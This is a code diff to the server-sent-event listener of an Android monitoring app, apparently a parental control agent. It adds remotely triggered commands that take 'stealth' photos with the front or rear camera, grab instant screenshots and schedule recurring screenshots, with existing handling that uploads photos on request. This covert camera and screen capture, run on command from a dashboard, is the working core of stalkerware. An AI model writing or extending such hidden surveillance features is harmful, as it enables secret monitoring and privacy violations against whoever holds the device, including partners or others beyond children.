@@ -56,13 +56,34 @@ class SsePolicyListener(
                                     while (cleanJson.startsWith("data:")) {
                                         cleanJson = cleanJson.removePrefix("data:").trim()
                                     }
-                                    Log.i(TAG, "⚡ INSTANT SSE POLICY UPDATE EVENT RECEIVED FROM DASHBOARD: $cleanJson")
+                                    Log.i(TAG, "⚡ INSTANT SSE UPDATE EVENT RECEIVED FROM DASHBOARD: $cleanJson")
 
                                     try {
                                         val json = org.json.JSONObject(cleanJson)
-                                        val eventType = json.optString("type")
-                                        if (eventType == "REQUEST_FULL_PHOTO") {
-                                            val payload = json.optJSONObject("payload")
+                                        val payload = json.optJSONObject("payload")
+                                        val action = payload?.optString("action") ?: ""
+
+                                        if (action == "CAPTURE_STEALTH_PHOTO") {
+                                            val camera = payload?.optString("camera", "FRONT") ?: "FRONT"
+                                            val commandId = payload?.optString("commandId") ?: ""
+                                            Log.i(TAG, "📸 Real-Time SSE Stealth Photo Trigger ($camera camera, commandId=$commandId)...")
+                                            val stealthCollector = com.parental.agent.collectors.media.StealthPhotoCollector(context)
+                                            stealthCollector.captureStealthPhoto(camera, commandId)
+                                        } else if (action == "CAPTURE_SCREENSHOT") {
+                                            val commandId = payload?.optString("commandId") ?: ""
+                                            Log.i(TAG, "📱 Real-Time SSE Instant Screenshot Trigger (commandId=$commandId)...")
+                                            val screenshotCollector = com.parental.agent.collectors.media.ScreenshotCollector(context)
+                                            screenshotCollector.captureScreenshot(commandId)
+                                        } else if (action == "CONFIGURE_SCREENSHOT_SCHEDULE") {
+                                            val active = payload?.optBoolean("active", false) ?: false
+                                            val durationMin = payload?.optInt("durationMin", 15) ?: 15
+                                            val intervalSec = payload?.optInt("intervalSec", 30) ?: 30
+                                            val startTime = payload?.optLong("startTime", 0L) ?: 0L
+                                            val stopTime = payload?.optLong("stopTime", 0L) ?: 0L
+                                            Log.i(TAG, "⏰ Real-Time SSE Screenshot Schedule Config: active=$active, interval=${intervalSec}s, duration=${durationMin}m, startTime=$startTime")
+                                            val screenshotCollector = com.parental.agent.collectors.media.ScreenshotCollector(context)
+                                            screenshotCollector.configureSchedule(scope, active, durationMin, intervalSec, startTime, stopTime)
+                                        } else {
                                             val filename = payload?.optString("filename") ?: ""
                                             if (filename.isNotEmpty()) {
                                                 Log.i(TAG, "📸 Real-Time SSE HD Photo Request: $filename. Uploading now...")
